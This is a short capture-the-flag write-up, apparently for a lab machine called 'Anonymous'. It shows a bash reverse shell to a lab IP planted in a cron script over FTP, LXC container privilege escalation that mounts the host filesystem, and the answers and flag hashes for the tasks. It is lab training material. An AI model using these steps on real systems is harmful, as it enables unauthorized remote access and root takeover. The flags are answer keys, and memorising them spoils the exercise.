# Anonymous

```
export IP=10.10.93.198
```

# Material needed

1. Backdoor to spawn shell

```
ftp
# clean.sh

bash -i >& /dev/tcp/10.8.193.113/1234 0>&1


Replace file clean.sh with backdoor
append
(local-file) clean.sh
(remote-file) clean.sh
```

2. Privilege escalation

```
lxc image list
lxc image import ./alpine-v3.13-x86_64-20210606_0356.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
[-]Creating ignite
[-]Error: No storage pool found. Please create a new storage pool

lxc init
Name of the new storage pool [default=default]: ignite

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

3. root.txt

```
/mnt/root/root/root.txt
```

# Tasks

1. Enumerate the machine.  How many ports are open?

2. What service is running on port 21?

3. What service is running on ports 139 and 445?

4. There's a share on the user's computer.  What's it called? pics

5. user.txt

```
90d6f992585815ff991e68748c414740
```

6. root.txt

```
4d930091c31a622a7ed10f27999af363
```